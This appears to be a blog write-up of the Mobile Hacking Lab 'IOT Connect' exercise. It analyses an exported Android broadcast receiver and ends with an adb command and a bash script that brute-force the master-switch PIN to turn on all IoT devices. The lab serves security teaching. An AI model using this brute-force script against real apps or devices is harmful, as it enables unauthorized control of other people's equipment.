---
layout: post
title: IOT Connect - Mobile Hacking Lab
color: rgb(51,122,183)
tags: [Mobile Hacking lab, Android Security]
comments: true
share: false
excerpt_separator: <!--more-->
---

The [IOT Connect](https://www.mobilehackinglab.com/course/lab-iot-connect) lab make us exploring a vulnerable broadcast receiver within an Android application, allowing interaction with IOT devices without permission. <!--more--> Let's go step by step to understand the vulnerability and how we can exploit such flaws.

### Introduction 

When we open the application, we are presented with a login and registration window. After registering and logging into the application, we have two buttons: the setup button, which allows us to individually connect to each device, and the master switch button, where we need to enter a PIN to connect all devices at once. However, since we don't know the PIN, let's examine the source code to understand how we can connect all devices at once.

### Static Analysis

We start by examining the Android manifest file, where we find a very interesting part, a receiver named `MasterReceiver` that is enabled and exported, meaning we can communicate with it from outside the application as long as it's running.

```xml
<!-- AndroidManifest.xml -->
...
<receiver android:name="com.mobilehackinglab.iotconnect.MasterReceiver" android:enabled="true" android:exported="true">
  <intent-filter>
      <action android:name="MASTER_ON"/>
  </intent-filter>
</receiver>
...
```

So what is a receiver? An [Android Receiver](https://developer.android.com/guide/topics/manifest/receiver-element) is a component that listens for system events or broadcast messages, responding to actions like incoming calls, SMS, or network changes, enabling apps to react even when not in use. In this case, the application is waiting for a broadcast called `MASTER_ON`.

Now let's see where the app is waiting for this Broadcast Receiver. It's inside the `CommunicationManager` class. Looking at the code, we can see that the application is expecting to receive a broadcast called `MASTER_ON` with extra data being an integer called `key`. If the application receives this intent with the correct key, all devices will be turned on simultaneously with a success popup. If we provide a wrong pin, we get a popup saying "Wrong Pin!"

```java
// CommunicationManager
package com.mobilehackinglab.iotconnect;

...
import kotlin.jvm.internal.Intrinsics;


public final class CommunicationManager {
    public static final CommunicationManager INSTANCE = new CommunicationManager();
    private static BroadcastReceiver masterReceiver;
    private static SharedPreferences sharedPreferences;

    private CommunicationManager() {
    }

    public final BroadcastReceiver initialize(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        masterReceiver = new BroadcastReceiver() { // from class: com.mobilehackinglab.iotconnect.CommunicationManager$initialize$1
            @Override // android.content.BroadcastReceiver
            public void onReceive(Context context2, Intent intent) {
                if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, "MASTER_ON")) {
                    int key = intent.getIntExtra("key", 0);
                    if (context2 != null) {
                        if (Checker.INSTANCE.check_key(key)) {
                            CommunicationManager.INSTANCE.turnOnAllDevices(context2);
                            Toast.makeText(context2, "All devices are turned on", 1).show();
                            return;
                        }
                        Toast.makeText(context2, "Wrong PIN!!", 1).show();
                    }
                }
            }
        };
        BroadcastReceiver broadcastReceiver = masterReceiver;
        if (broadcastReceiver == null) {
            Intrinsics.throwUninitializedPropertyAccessException("masterReceiver");
            broadcastReceiver = null;
        }
        context.registerReceiver(broadcastReceiver, new IntentFilter("MASTER_ON"));
        BroadcastReceiver broadcastReceiver2 = masterReceiver;
        if (broadcastReceiver2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("masterReceiver");
            return null;
        }
        return broadcastReceiver2;
    }

    public final void turnOnAllDevices(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        Log.d("TURN ON", "Turning all devices on");
        turnOnDevice(context, FansFragment.FAN_STATE_PREFERENCES, FansFragment.FAN_ONE_STATE_KEY, true);
        turnOnDevice(context, FansFragment.FAN_STATE_PREFERENCES, FansFragment.FAN_TWO_STATE_KEY, true);
        turnOnDevice(context, ACFragment.AC_PREFERENCES, ACFragment.AC_STATE_KEY, true);
        turnOnDevice(context, PlugFragment.PLUG_FRAGMENT_PREFERENCES, PlugFragment.PLUG_STATE_KEY, true);
        turnOnDevice(context, SpeakerFragment.SPEAKER_FRAGMENT_PREFERENCES, SpeakerFragment.SPEAKER_STATE_KEY, true);
        turnOnDevice(context, TVFragment.TV_FRAGMENT_PREFERENCES, TVFragment.TV_STATE_KEY, true);
        turnOnDevice(context, BulbsFragment.BULB_FRAGMENT_PREFERENCES, BulbsFragment.BULB_STATE_KEY, true);
    }

    public final void turnOnDevice(Context context, String preferencesName, String stateKey, boolean defaultState) {
        Intrinsics.checkNotNullParameter(context, "context");
        Intrinsics.checkNotNullParameter(preferencesName, "preferencesName");
        Intrinsics.checkNotNullParameter(stateKey, "stateKey");
        SharedPreferences sharedPreferences2 = context.getSharedPreferences(preferencesName, 0);
        Intrinsics.checkNotNullExpressionValue(sharedPreferences2, "getSharedPreferences(...)");
        sharedPreferences = sharedPreferences2;
        SharedPreferences sharedPreferences3 = sharedPreferences;
        if (sharedPreferences3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("sharedPreferences");
            sharedPreferences3 = null;
        }
        SharedPreferences.Editor $this$turnOnDevice_u24lambda_u240 = sharedPreferences3.edit();
        $this$turnOnDevice_u24lambda_u240.putBoolean(stateKey, defaultState);
        $this$turnOnDevice_u24lambda_u240.apply();
    }
}
```

Looking at the `LoginActivity`, `HomeActivity`, and `MasterSwitchActivity` classes, we can see that they all register the broadcast receiver from the `CommunicationManager` class to wait for the intent. How can we communicate with this intent?

```java
// Registration of the broadcast
...
CommunicationManager.INSTANCE.initialize(this);
...
```

### Exploiting the Application

To test if the application receives our intent, all we have to do is open the app and run the following command from our terminal:

```bash
adb shell am broadcast -a MASTER_ON --ei key 123
```

Running this, we see the popup saying "Wrong Pin!!". From here, all we need to do is loop from 000 to 999, since the master switch activity states it is a 3-digit pin, to brute force turning on all devices without knowing the right pin.

So, we create the following bash script:

```bash
#exploit.sh
# Loop from 000 to 999
for ((i=0; i<=999; i++))
do
    # Pad the number with leading zeros
    key=$(printf "%03d" $i)
    
    # Send the broadcast with adb
    adb shell am broadcast -a MASTER_ON --ei key $key >/dev/null 2>&1
done

echo "Done Bruteforcing!"
```

Now all we have to do is run our script and wait.
```bash
bash exploit.sh
```

After seeing the message "Done Bruteforcing!" in our terminal, if we open the app, we can see that all devices have been turned on.

### Conclusion

This lab allows us to understand the concept of broadcast receivers within an Android application and how they can pose risks to the application. By exploiting this flaw, we can see that even an unauthenticated user can perform actions they shouldn't while having the application running on their phone. For a hands-on experience with these concepts, visit the lab at [MobileHackingLab - IOT Connect](https://www.mobilehackinglab.com/course/lab-iot-connect). Embark on a journey of discovery and bolster your expertise in mobile security.